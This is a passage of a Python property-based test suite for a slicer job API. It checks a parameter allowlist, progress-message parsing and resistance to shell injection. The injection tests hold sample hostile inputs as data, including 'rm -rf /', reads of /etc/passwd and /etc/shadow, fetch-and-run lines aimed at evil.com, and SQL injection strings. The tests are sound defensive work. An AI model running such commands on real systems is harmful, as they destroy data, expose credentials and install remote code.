        # Generate arbitrary strings that are likely NOT in the allowlist
        unknown_key=st.text(
            min_size=1,
            max_size=50,
            alphabet=st.characters(
                blacklist_categories=['Cc', 'Cs'],  # Exclude control chars
                blacklist_characters=['\x00', '=', '\n', '\r']
            )
        ).filter(lambda s: s not in {
            # Exclude keys that we know ARE in the allowlist
            "layer_height", "fill_density", "infill_speed", "support_enable",
            "temperature", "bed_temperature", "retraction_length", "print_speed",
            "wall_thickness", "top_bottom_thickness", "infill_pattern",
            "support_type", "brim_width", "skirt_distance", "z_offset",
            "flow_ratio", "fan_speed", "bridge_speed", "travel_speed"
        }),
        # Also test with different casing and special chars
        param_value=st.one_of(
            st.floats(min_value=0.0, max_value=100.0, allow_nan=False, allow_infinity=False),
            st.integers(min_value=0, max_value=1000),
            st.booleans(),
            st.text(min_size=1, max_size=30)
        )
    )
    def test_property_16_unknown_keys_rejected_no_cli_invocation(
        self, tmp_path, unknown_key, param_value
    ):
        """
        **Property 16: Parameter key allowlist is enforced**
        
        Generate arbitrary parameter keys that are not in PARAM_ALLOWLIST and
        verify they would be rejected by the job submission endpoint with HTTP 422.
        
        Since we're testing the CLI builder in isolation, we simulate the validation
        that should happen before build_cli_args is called. In the actual API,
        the jobs router validates keys against PARAM_ALLOWLIST before calling
        build_cli_args.
        
        This test demonstrates that:
        1. Unknown keys should be detected
        2. They should not make it into the CLI args
        3. The system should reject them before CLI invocation
        
        **Validates: Requirements 11.4**
        """
        from app.routers.parameters import get_param_allowlist
        
        # Get the actual allowlist from the parameters module
        param_allowlist = get_param_allowlist()
        
        # Skip this test case if the generated key happens to be in the allowlist
        # (very unlikely, but Hypothesis might generate it)
        if unknown_key in param_allowlist:
            return
        
        # Create a mock config
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True, exist_ok=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True, exist_ok=True)
        
        # Create a job request with the unknown parameter key
        job = {
            "file_ids": [],
            "action": "slice",
            "parameter_overrides": {
                unknown_key: param_value,
            }
        }
        
        # In the actual API flow, the jobs router validates parameter keys
        # BEFORE calling build_cli_args. We simulate that validation here.
        
        # Verify the key is not in the allowlist
        assert unknown_key not in param_allowlist, (
            f"Generated key {unknown_key!r} should not be in allowlist for this test"
        )
        
        # The API would raise HTTPException(422) at this point.
        # We'll demonstrate what would happen if validation was bypassed.
        
        # If validation was bypassed (which it shouldn't be), the CLI args
        # would still be built, but this represents a security failure.
        # The test verifies that the allowlist check catches the unknown key.
        
        # Simulate the validation that happens in POST /api/jobs
        validation_failed = unknown_key not in param_allowlist
        
        assert validation_failed, (
            f"Unknown parameter key {unknown_key!r} should be rejected by allowlist validation"
        )
        
        # In a real scenario, we would NOT call build_cli_args if validation fails
        # But let's verify that if it DID get through, the key would be in the args
        # (showing why validation is critical)
        if not validation_failed:
            # This branch should never execute in correct implementation
            args = build_cli_args(job, config, {}, output_dir)
            pytest.fail(
                f"Parameter key {unknown_key!r} was not in allowlist but would have "
                f"been passed to CLI: {args}"
            )

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Test case-sensitivity: generate keys with different casing
        base_key=st.sampled_from([
            "layer_height", "fill_density", "support_enable", "temperature"
        ]),
        case_transform=st.sampled_from(["upper", "lower", "title", "swap"])
    )
    def test_property_16_case_sensitive_keys(self, base_key, case_transform):
        """
        **Property 16: Parameter key allowlist is enforced**
        
        Verify that parameter keys are case-sensitive. Keys that differ only in
        case from allowlisted keys should be rejected.
        
        **Validates: Requirements 11.4**
        """
        from app.routers.parameters import get_param_allowlist
        
        param_allowlist = get_param_allowlist()
        
        # Apply case transformation
        if case_transform == "upper":
            modified_key = base_key.upper()
        elif case_transform == "lower":
            modified_key = base_key.lower()
        elif case_transform == "title":
            modified_key = base_key.title()
        else:  # swap
            modified_key = base_key.swapcase()
        
        # If the transformation produces the same key, skip
        if modified_key == base_key:
            return
        
        # The modified key should only be valid if it's explicitly in the allowlist
        if modified_key in param_allowlist:
            # This is a valid key (happens to be in allowlist with this casing)
            return
        else:
            # This is an invalid key - should be rejected
            assert modified_key not in param_allowlist, (
                f"Modified key {modified_key!r} (from {base_key!r}) should not be in allowlist"
            )

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Test keys with whitespace and special characters
        base_key=st.sampled_from(["layer_height", "temperature", "support_enable"]),
        prefix=st.sampled_from(["", " ", "_", "-", "x_"]),
        suffix=st.sampled_from(["", " ", "_", "-", "_x", "!"]),
    )
    def test_property_16_whitespace_and_special_chars_rejected(
        self, base_key, prefix, suffix
    ):
        """
        **Property 16: Parameter key allowlist is enforced**
        
        Verify that parameter keys with added whitespace or special characters
        are rejected if they don't exactly match an allowlisted key.
        
        **Validates: Requirements 11.4**
        """
        from app.routers.parameters import get_param_allowlist
        
        param_allowlist = get_param_allowlist()
        
        # Create modified key with prefix/suffix
        modified_key = f"{prefix}{base_key}{suffix}"
        
        # Skip if the modification produces the original key
        if modified_key == base_key:
            return
        
        # Check if the modified key is in the allowlist
        if modified_key in param_allowlist:
            # It happens to be a valid key
            return
        else:
            # Should be rejected
            assert modified_key not in param_allowlist, (
                f"Modified key {modified_key!r} should not be in allowlist "
                f"(base: {base_key!r}, prefix: {prefix!r}, suffix: {suffix!r})"
            )

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Generate completely random keys unlikely to be in allowlist
        random_key=st.text(
            min_size=5,
            max_size=40,
            alphabet=st.characters(
                whitelist_categories=['Lu', 'Ll', 'Nd'],  # Letters and digits
                blacklist_characters=['_']  # Most param keys use underscores
            )
        ).filter(lambda s: '_' not in s)  # Exclude keys with underscores
    )
    def test_property_16_random_keys_rejected(self, random_key):
        """
        **Property 16: Parameter key allowlist is enforced**
        
        Generate completely random parameter keys (without underscores, which
        are common in real parameter keys) and verify they are not in the
        allowlist.
        
        **Validates: Requirements 11.4**
        """
        from app.routers.parameters import get_param_allowlist
        
        param_allowlist = get_param_allowlist()
        
        # These random keys should almost certainly not be in the allowlist
        if random_key in param_allowlist:
            # Very unlikely, but if it happens, the key is valid
            return
        
        # Verify the random key is not in the allowlist
        assert random_key not in param_allowlist, (
            f"Random key {random_key!r} should not be in allowlist"
        )

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Generate SQL injection patterns that might be attempted as keys
        malicious_key=st.sampled_from([
            "'; DROP TABLE jobs; --",
            "1' OR '1'='1",
            "admin'--",
            "'; DELETE FROM files WHERE '1'='1",
            "layer_height'; UPDATE jobs SET status='completed'; --",
        ])
    )
    def test_property_16_sql_injection_keys_rejected(self, malicious_key):
        """
        **Property 16: Parameter key allowlist is enforced**
        
        Verify that keys containing SQL injection patterns are rejected by
        the allowlist validation.
        
        **Validates: Requirements 11.4**
        """
        from app.routers.parameters import get_param_allowlist
        
        param_allowlist = get_param_allowlist()
        
        # These malicious keys should not be in the allowlist
        assert malicious_key not in param_allowlist, (
            f"Malicious key {malicious_key!r} should not be in allowlist"
        )

    @settings(
        max_examples=50,  # Fewer examples since this tests actual allowlist
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Mix of valid and invalid keys
        keys=st.lists(
            st.one_of(
                # Some valid keys
                st.sampled_from([
                    "layer_height", "fill_density", "support_enable", "temperature"
                ]),
                # Some invalid keys
                st.text(
                    min_size=1,
                    max_size=30,
                    alphabet=st.characters(whitelist_categories=['Lu', 'Ll'])
                ).filter(lambda s: len(s) > 15)  # Long keys unlikely to be valid
            ),
            min_size=1,
            max_size=10,
            unique=True
        )
    )
    def test_property_16_mixed_valid_invalid_keys(self, tmp_path, keys):
        """
        **Property 16: Parameter key allowlist is enforced**
        
        Test job requests with a mix of valid and invalid parameter keys.
        If ANY key is invalid, the entire request should be rejected.
        
        **Validates: Requirements 11.4**
        """
        from app.routers.parameters import get_param_allowlist
        
        param_allowlist = get_param_allowlist()
        
        # Create a mock config
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True, exist_ok=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True, exist_ok=True)
        
        # Build parameter overrides
        overrides = {key: 100 for key in keys}
        
        job = {
            "file_ids": [],
            "action": "slice",
            "parameter_overrides": overrides,
        }
        
        # Check if all keys are valid
        all_valid = all(key in param_allowlist for key in keys)
        has_invalid = any(key not in param_allowlist for key in keys)
        
        if has_invalid:
            # Simulate the validation that would happen in the API
            # At least one key is invalid, so the request should be rejected
            invalid_keys = [key for key in keys if key not in param_allowlist]
            assert len(invalid_keys) > 0, "Should have at least one invalid key"
            
            # Verification: These invalid keys should NOT be in allowlist
            for invalid_key in invalid_keys:
                assert invalid_key not in param_allowlist, (
                    f"Key {invalid_key!r} should not be in allowlist"
                )
        else:
            # All keys are valid - job could proceed
            args = build_cli_args(job, config, {}, output_dir)
            
            # Verify all parameters appear in CLI args (as dashed flags —
            # see ConfigOptionDef::cli_args, libslic3r/Config.cpp:238-254)
            for key in keys:
                cli_flag = key.replace("_", "-")
                assert any(f"--{cli_flag}=" in arg for arg in args), (
                    f"Valid parameter {key} should appear in CLI args"
                )


class TestProgressMessagePropertyTests:
    """
    Property-based tests for progress message field requirements.
    
    Property 12: Progress messages contain all required fields
    
    For any raw progress line emitted by the CLI to stdout/pipe, the parsed
    and forwarded WebSocket ProgressUpdateEvent shall contain non-null values
    for plate_index, plate_count, plate_percent, total_percent, and message.
    
    Validates: Requirements 7.2
    """

    def _parse_progress_line_test_helper(self, line: str, job_id: str):
        """
        Helper method that mimics JobManager._parse_progress_line for testing.
        
        This is a copy of the parsing logic from job_manager.py to allow
        testing without instantiating a full JobManager.
        """
        import re
        from datetime import datetime
        
        line = line.strip()
        if not line:
            return None
        
        # Pattern 1: Warning detection (case-insensitive) - check first to avoid false positives
        if re.search(r'\bwarn(ing)?\b', line, re.IGNORECASE):
            return {
                "type": "warning",
                "job_id": job_id,
                "warning": line,
                "timestamp": datetime.utcnow().isoformat(),
            }
        
        # Pattern 2: Plate progress (e.g., "Plate 1/3: 50%") - more specific than simple percentage
        plate_match = re.search(r'[Pp]late\s+(\d+)/(\d+)[:\s]+(\d+)%', line)
        if plate_match:
            plate_index = int(plate_match.group(1)) - 1  # Convert to 0-based
            plate_count = int(plate_match.group(2))
            plate_percent = int(plate_match.group(3))
            # Estimate total percent based on plate progress
            total_percent = int((plate_index * 100 + plate_percent) / plate_count)
            return {
                "type": "progress",
                "job_id": job_id,
                "plate_index": plate_index,
                "plate_count": plate_count,
                "plate_percent": plate_percent,
                "total_percent": total_percent,
                "message": line,
                "timestamp": datetime.utcnow().isoformat(),
            }
        
        # Pattern 3: Progress percentage (e.g., "Slicing: 45%", "Processing: 75%")
        percent_match = re.search(r'(\d+)%', line)
        if percent_match:
            percent = int(percent_match.group(1))
            return {
                "type": "progress",
                "job_id": job_id,
                "plate_index": 0,  # Default to first plate
                "plate_count": 1,  # Default to single plate
                "plate_percent": percent,
                "total_percent": percent,
                "message": line,
                "timestamp": datetime.utcnow().isoformat(),
            }
        
        # Pattern 4: Status messages (informational)
        status_keywords = [
            'slicing', 'processing', 'generating', 'analyzing',
            'preparing', 'loading', 'saving', 'exporting'
        ]
        if any(keyword in line.lower() for keyword in status_keywords):
            return {
                "type": "progress",
                "job_id": job_id,
                "plate_index": 0,
                "plate_count": 1,
                "plate_percent": 0,
                "total_percent": 0,
                "message": line,
                "timestamp": datetime.utcnow().isoformat(),
            }
        
        return None

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Generate mock CLI progress lines with plate information
        plate_index=st.integers(min_value=1, max_value=10),
        plate_count=st.integers(min_value=1, max_value=10),
        plate_percent=st.integers(min_value=0, max_value=100),
        message_prefix=st.sampled_from([
            "Slicing", "Processing", "Generating gcode", "Analyzing",
            "Preparing", "Computing", "Optimizing"
        ])
    )
    def test_property_12_plate_progress_contains_all_fields(
        self, plate_index, plate_count, plate_percent, message_prefix
    ):
        """
        **Property 12: Progress messages contain all required fields**
        
        Generate mock CLI progress lines with plate information (e.g., "Plate 1/3: 50%")
        and verify that the parsed event contains all required fields:
        - plate_index (non-null, 0-based)
        - plate_count (non-null)
        - plate_percent (non-null, 0-100)
        - total_percent (non-null, 0-100)
        - message (non-null string)
        
        **Validates: Requirements 7.2**
        """
        # Only test valid combinations where plate_index <= plate_count
        if plate_index > plate_count:
            plate_index, plate_count = plate_count, plate_index
        
        # Create mock CLI progress line
        progress_line = f"{message_prefix} - Plate {plate_index}/{plate_count}: {plate_percent}%"
        
        # Parse the progress line using helper method
        test_job_id = "test-job-id"
        event = self._parse_progress_line_test_helper(progress_line, test_job_id)
        
        # Assert event was created (not None)
        assert event is not None, (
            f"Progress line {progress_line!r} should produce a progress event"
        )
        
        # Assert all required fields are present and non-null
        required_fields = ["plate_index", "plate_count", "plate_percent", "total_percent", "message"]
        for field in required_fields:
            assert field in event, (
                f"Progress event must contain field {field!r}. "
                f"Event: {event}, Line: {progress_line!r}"
            )
            assert event[field] is not None, (
                f"Field {field!r} must not be None. "
                f"Event: {event}, Line: {progress_line!r}"
            )
        
        # Verify field values are correct types
        assert isinstance(event["plate_index"], int), "plate_index must be an integer"
        assert isinstance(event["plate_count"], int), "plate_count must be an integer"
        assert isinstance(event["plate_percent"], int), "plate_percent must be an integer"
        assert isinstance(event["total_percent"], int), "total_percent must be an integer"
        assert isinstance(event["message"], str), "message must be a string"
        
        # Verify field values are in valid ranges
        assert event["plate_index"] >= 0, "plate_index must be non-negative (0-based)"
        assert event["plate_count"] >= 1, "plate_count must be at least 1"
        assert 0 <= event["plate_percent"] <= 100, "plate_percent must be in range [0, 100]"
        assert 0 <= event["total_percent"] <= 100, "total_percent must be in range [0, 100]"
        assert len(event["message"]) > 0, "message must be non-empty"
        
        # Verify plate_index matches (converted to 0-based)
        assert event["plate_index"] == plate_index - 1, (
            f"plate_index should be {plate_index - 1} (0-based from {plate_index}), "
            f"but got {event['plate_index']}"
        )
        
        # Verify plate_count matches
        assert event["plate_count"] == plate_count, (
            f"plate_count should be {plate_count}, but got {event['plate_count']}"
        )
        
        # Verify plate_percent matches
        assert event["plate_percent"] == plate_percent, (
            f"plate_percent should be {plate_percent}, but got {event['plate_percent']}"
        )

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Generate mock CLI progress lines with simple percentage
        percent=st.integers(min_value=0, max_value=100),
        status_text=st.sampled_from([
            "Slicing", "Processing model", "Generating gcode",
            "Analyzing geometry", "Computing paths", "Optimizing"
        ])
    )
    def test_property_12_simple_percent_progress_contains_all_fields(
        self, percent, status_text
    ):
        """
        **Property 12: Progress messages contain all required fields**
        
        Generate mock CLI progress lines with simple percentage (e.g., "Slicing: 45%")
        and verify all required fields are present with default values where appropriate.
        
        **Validates: Requirements 7.2**
        """
        # Create mock CLI progress line
        progress_line = f"{status_text}: {percent}%"
        
        # Parse the progress line using helper method
        test_job_id = "test-job-id"
        event = self._parse_progress_line_test_helper(progress_line, test_job_id)
        
        # Assert event was created
        assert event is not None, (
            f"Progress line {progress_line!r} should produce a progress event"
        )
        
        # Assert all required fields are present and non-null
        required_fields = ["plate_index", "plate_count", "plate_percent", "total_percent", "message"]
        for field in required_fields:
            assert field in event, (
                f"Progress event must contain field {field!r}. Event: {event}"
            )
            assert event[field] is not None, (
                f"Field {field!r} must not be None. Event: {event}"
            )
        
        # Verify types
        assert isinstance(event["plate_index"], int)
        assert isinstance(event["plate_count"], int)
        assert isinstance(event["plate_percent"], int)
        assert isinstance(event["total_percent"], int)
        assert isinstance(event["message"], str)
        
        # Verify ranges
        assert event["plate_index"] >= 0
        assert event["plate_count"] >= 1
        assert 0 <= event["plate_percent"] <= 100
        assert 0 <= event["total_percent"] <= 100
        assert len(event["message"]) > 0

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Generate mock CLI status messages without explicit percentages
        status_keyword=st.sampled_from([
            "slicing", "processing", "generating", "analyzing",
            "preparing", "loading", "saving", "exporting"
        ]),
        detail=st.text(min_size=0, max_size=50, alphabet=st.characters(
            blacklist_categories=['Cc'],
            blacklist_characters=['\x00', '\n', '\r']
        ))
    )
    def test_property_12_status_message_contains_all_fields(
        self, status_keyword, detail
    ):
        """
        **Property 12: Progress messages contain all required fields**
        
        Generate mock CLI status messages (e.g., "Processing model geometry")
        and verify they produce events with all required fields.
        
        **Validates: Requirements 7.2**
        """
        # Create mock CLI status line
        progress_line = f"{status_keyword.capitalize()} {detail}".strip()
        
        # Skip empty lines
        if not progress_line:
            return
        
        # Parse the progress line using helper method
        test_job_id = "test-job-id"
        event = self._parse_progress_line_test_helper(progress_line, test_job_id)
        
        # Status messages may or may not produce events depending on keywords
        # If an event is produced, it must have all required fields
        if event is not None and event.get("type") == "progress":
            # Assert all required fields are present and non-null
            required_fields = ["plate_index", "plate_count", "plate_percent", "total_percent", "message"]
            for field in required_fields:
                assert field in event, (
                    f"Progress event must contain field {field!r}. Event: {event}"
                )
                assert event[field] is not None, (
                    f"Field {field!r} must not be None. Event: {event}"
                )
            
            # Verify types
            assert isinstance(event["plate_index"], int)
            assert isinstance(event["plate_count"], int)
            assert isinstance(event["plate_percent"], int)
            assert isinstance(event["total_percent"], int)
            assert isinstance(event["message"], str)
            
            # Verify ranges
            assert event["plate_index"] >= 0
            assert event["plate_count"] >= 1
            assert 0 <= event["plate_percent"] <= 100
            assert 0 <= event["total_percent"] <= 100
            assert len(event["message"]) > 0

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Generate various CLI output patterns
        data=st.data()
    )
    def test_property_12_all_progress_events_have_required_fields(self, data):
        """
        **Property 12: Progress messages contain all required fields**
        
        Generate a variety of CLI output patterns and verify that whenever
        a progress event is produced, it contains all required fields.
        
        **Validates: Requirements 7.2**
        """
        # Generate one of several patterns
        pattern_choice = data.draw(st.sampled_from([
            "plate_progress",
            "simple_percent",
            "status_keyword",
            "complex_message"
        ]))
        
        if pattern_choice == "plate_progress":
            plate_num = data.draw(st.integers(min_value=1, max_value=5))
            plate_total = data.draw(st.integers(min_value=plate_num, max_value=10))
            percent = data.draw(st.integers(min_value=0, max_value=100))
            progress_line = f"Plate {plate_num}/{plate_total}: {percent}%"
        
        elif pattern_choice == "simple_percent":
            percent = data.draw(st.integers(min_value=0, max_value=100))
            action = data.draw(st.sampled_from(["Slicing", "Processing", "Generating"]))
            progress_line = f"{action}: {percent}%"
        
        elif pattern_choice == "status_keyword":
            keyword = data.draw(st.sampled_from([
                "slicing", "processing", "generating", "analyzing"
            ]))
            progress_line = f"{keyword.capitalize()} model data"
        
        else:  # complex_message
            plate = data.draw(st.integers(min_value=1, max_value=3))
            total = data.draw(st.integers(min_value=plate, max_value=3))
            percent = data.draw(st.integers(min_value=0, max_value=100))
            progress_line = f"[INFO] Slicing plate {plate} of {total} ({percent}% complete)"
        
        # Parse the progress line using helper method
        test_job_id = "test-job-id"
        event = self._parse_progress_line_test_helper(progress_line, test_job_id)
        
        # If an event is produced and it's a progress event, verify all fields
        if event is not None and event.get("type") == "progress":
            required_fields = ["plate_index", "plate_count", "plate_percent", "total_percent", "message"]
            
            for field in required_fields:
                assert field in event, (
                    f"Progress event must contain field {field!r}. "
                    f"Event: {event}, Line: {progress_line!r}"
                )
                assert event[field] is not None, (
                    f"Field {field!r} must not be None. "
                    f"Event: {event}, Line: {progress_line!r}"
                )
            
            # Verify types and ranges
            assert isinstance(event["plate_index"], int) and event["plate_index"] >= 0
            assert isinstance(event["plate_count"], int) and event["plate_count"] >= 1
            assert isinstance(event["plate_percent"], int) and 0 <= event["plate_percent"] <= 100
            assert isinstance(event["total_percent"], int) and 0 <= event["total_percent"] <= 100
            assert isinstance(event["message"], str) and len(event["message"]) > 0


class TestShellInjectionPropertyTests:
    """
    Property-based tests for shell injection prevention.
    
    Property 10: CLI command is a well-formed list (no shell injection)
    
    For any job request whose string fields contain shell metacharacters
    (; | && $ ` > < \\ ' "), the resulting CLI args list shall be an array
    of strings where each element is passed as a distinct positional argument
    to asyncio.create_subprocess_exec. No metacharacter shall alter the
    argument count or meaning.
    
    Validates: Requirements 6.2, 11.2
    """

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Generate strings with various shell metacharacters
        param_value=st.text(
            min_size=1,
            max_size=50,
            alphabet=st.characters(
                blacklist_categories=['Cc'],  # Exclude control characters
                blacklist_characters=['\x00']  # Exclude null bytes
            )
        ).filter(lambda s: any(char in s for char in [';', '|', '&', '$', '`', '>', '<', '\\', "'", '"']))
    )
    def test_property_10_shell_metacharacters_in_parameter_values(self, tmp_path, param_value):
        """
        **Property 10: CLI command is a well-formed list (no shell injection)**
        
        Generate parameter values with shell metacharacters and verify they
        become single argv elements without altering command structure.
        """
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True, exist_ok=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True, exist_ok=True)
        
        # Create job with parameter containing shell metacharacters
        job = {
            "file_ids": [],
            "action": "slice",
            "parameter_overrides": {
                "custom_parameter": param_value,
            }
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        # Verify args is a list, not a string
        assert isinstance(args, list), "CLI args must be a list, not a string"
        
        # Verify all elements are strings
        assert all(isinstance(arg, str) for arg in args), "All CLI args must be strings"
        
        # The parameter should appear as a single argument in the form
        # --key-with-dashes=value (CLI flag names replace underscores with
        # dashes — see ConfigOptionDef::cli_args, libslic3r/Config.cpp:238-254)
        expected_arg = f"--custom-parameter={param_value}"
        assert expected_arg in args, (
            f"Expected {expected_arg!r} to be a single element in args. "
            f"Shell metacharacters should not split or alter the argument."
        )
        
        # Count the number of arguments - shell metacharacters should not increase count
        # We expect: CLI_path, --slice, 0, --outputdir, output_dir_path, --custom_parameter=value
        # Total: 6 arguments (approximately, may vary with config)
        base_args = [
            config.orca_cli_path,
            "--slice",
            "--outputdir",
        ]
        
        # The metacharacters should not have created additional arguments
        # If they were interpreted by a shell, we'd see many more arguments
        assert len(args) < 20, (
            f"Too many arguments generated ({len(args)}). "
            f"Shell metacharacters may have been interpreted."
        )

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Generate dangerous command injection attempts
        injection_attempt=st.sampled_from([
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& echo 'hacked'",
            "$(whoami)",
            "`id`",
            "> /tmp/evil",
            "< /etc/shadow",
            "\"; cat /etc/passwd; echo \"",
            "' || true #",
            "$(curl evil.com/shell.sh | bash)",
            "; wget http://evil.com/malware -O /tmp/x; chmod +x /tmp/x; /tmp/x &",
        ])
    )
    def test_property_10_command_injection_attempts_neutralized(self, tmp_path, injection_attempt):
        """
        **Property 10: CLI command is a well-formed list (no shell injection)**
        
        Test that common command injection patterns are safely passed as
        literal strings without shell interpretation.
        """
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True, exist_ok=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True, exist_ok=True)
        
        # Try injection in multiple fields
        jobs_to_test = [
            # Parameter override
            {
                "file_ids": [],
                "action": "slice",
                "parameter_overrides": {
                    "injection_test": injection_attempt,
                }
            },
            # Transform rotate value (though numeric, test string injection)
            {
                "file_ids": [],
                "action": "slice",
                "transforms": {
                    "rotate": injection_attempt if not injection_attempt.startswith(("$", "`")) else 0,
                }
            },
            # Misc datadir
            {
                "file_ids": [],
                "action": "slice",
                "misc": {
                    "datadir": injection_attempt,
                }
            },
        ]
        
        for job in jobs_to_test:
            args = build_cli_args(job, config, {}, output_dir)
            
            # Verify args is a proper list
            assert isinstance(args, list), "CLI args must be a list"
            assert all(isinstance(arg, str) for arg in args), "All args must be strings"
            
            # The injection attempt should appear as part of a single argument
            # Find the argument containing the injection attempt
            found = False
            for arg in args:
                if injection_attempt in arg:
                    found = True
                    # The injection attempt should be contained within a single argument
                    # It should not have been split by the shell
                    assert arg.count(injection_attempt) == 1, (
                        f"Injection attempt should appear exactly once in argument, got: {arg}"
                    )
            
            # At least one argument should contain the injection attempt
            # (unless it was in a field that got filtered/validated)
            if "injection_test" in job.get("parameter_overrides", {}):
                assert found, f"Injection attempt {injection_attempt!r} should be in args"

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Generate various metacharacter combinations
        metachar1=st.sampled_from([';', '|', '&', '$', '`', '>', '<']),
        metachar2=st.sampled_from([';', '|', '&', '$', '`', '>', '<']),
        text_before=st.text(min_size=0, max_size=20, alphabet=st.characters(
            blacklist_categories=['Cc'],
            blacklist_characters=['\x00']
        )),
        text_after=st.text(min_size=0, max_size=20, alphabet=st.characters(
            blacklist_categories=['Cc'],
            blacklist_characters=['\x00']
        )),
    )
    def test_property_10_metacharacter_combinations(
        self, tmp_path, metachar1, metachar2, text_before, text_after
    ):
        """
        **Property 10: CLI command is a well-formed list (no shell injection)**
        
        Generate various combinations of shell metacharacters embedded in text
        and verify they don't alter the CLI argument structure.
        """
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True, exist_ok=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True, exist_ok=True)
        
        # Build a value with metacharacters embedded
        malicious_value = f"{text_before}{metachar1}{metachar2}{text_after}"
        
        job = {
            "file_ids": [],
            "action": "slice",
            "parameter_overrides": {
                "test_param": malicious_value,
            }
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        # Verify proper list structure
        assert isinstance(args, list)
        assert all(isinstance(arg, str) for arg in args)
        
        # The parameter should be in a single argument (dashed flag name)
        expected = f"--test-param={malicious_value}"
        assert expected in args, f"Expected {expected!r} as single argument"
        
        # Verify the metacharacters didn't cause argument splitting
        # by checking that we don't have an excessive number of arguments
        assert len(args) < 15, f"Unexpected arg count: {len(args)}, args: {args}"

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Test quote escaping
        quote_style=st.sampled_from(["'", '"', "`"]),
        inner_text=st.text(min_size=0, max_size=30, alphabet=st.characters(
            blacklist_categories=['Cc'],
            blacklist_characters=['\x00']
        )),
    )
    def test_property_10_quote_characters_safe(self, tmp_path, quote_style, inner_text):
        """
        **Property 10: CLI command is a well-formed list (no shell injection)**
        
        Verify that quote characters in values don't allow escaping or
        command injection.
        """
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True, exist_ok=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True, exist_ok=True)
        
        # Create value with quotes
        quoted_value = f"{quote_style}{inner_text}{quote_style}"
        
        job = {
            "file_ids": [],
            "action": "slice",
            "parameter_overrides": {
                "quoted_param": quoted_value,
            }
        }
        
        args = build_cli_args(job, config, {}, output_dir)
        
        # Verify list structure
        assert isinstance(args, list)
        assert all(isinstance(arg, str) for arg in args)
        
        # The quoted value should be part of a single argument (dashed flag name)
        expected = f"--quoted-param={quoted_value}"
        assert expected in args, (
            f"Quote characters should not break argument boundaries. "
            f"Expected {expected!r} in args."
        )

    @settings(
        max_examples=100,
        deadline=timedelta(seconds=5),
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    @given(
        # Generate file IDs with shell metacharacters (though they should be validated elsewhere)
        file_content=st.text(
            min_size=1, 
            max_size=30, 
            alphabet=st.characters(
                blacklist_categories=['Cc', 'Cs'],  # Exclude control and surrogate chars
                blacklist_characters=['\x00', '/']  # Exclude null bytes and path separators
            )
        ).filter(lambda s: any(char in s for char in [';', '|', '&', '$']))
    )
    def test_property_10_file_paths_with_metacharacters(self, tmp_path, file_content):
        """
        **Property 10: CLI command is a well-formed list (no shell injection)**
        
        Verify that even if filenames contain shell metacharacters, they are
        safely passed as path arguments.
        """
        config = MockConfig(tmp_path)
        session_dir = config.tmp_root / "sessions" / "s1"
        session_dir.mkdir(parents=True, exist_ok=True)
        output_dir = config.tmp_root / "jobs" / "j1" / "output"
        output_dir.mkdir(parents=True, exist_ok=True)
        
        # Create a file with metacharacters in its name
        # Note: This is a contrived scenario; real system should sanitize filenames
        safe_filename = f"file_{file_content.replace('/', '_')}.stl"
        file_id = "meta_test_id"
        file_path = session_dir / "uploads" / safe_filename
        file_path.parent.mkdir(parents=True, exist_ok=True)
        
        try:
            file_path.touch()
        except (OSError, UnicodeEncodeError):
            # Some filesystems can't handle certain characters
            # In production, these would be rejected at upload time
            # For this test, we'll skip cases where the filesystem can't handle it
            return
        
        job = {
            "file_ids": [file_id],
            "action": "slice",
        }
        
        args = build_cli_args(job, config, {file_id: file_path}, output_dir)
        
        # Verify list structure
        assert isinstance(args, list)
